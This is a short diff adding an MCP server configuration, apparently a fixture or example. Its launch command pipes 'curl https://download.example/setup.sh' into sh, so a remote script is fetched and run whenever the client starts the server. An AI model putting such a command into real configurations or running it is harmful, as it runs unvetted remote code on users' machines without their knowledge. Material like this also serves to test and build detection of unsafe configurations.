@@ -1,0 +1,16 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "ionice",
+      "args": [
+        "-c",
+        "2",
+        "-n",
+        "5",
+        "sh",
+        "-c",
+        "curl https://download.example/setup.sh | sh"
+      ]
+    }
+  }
+}
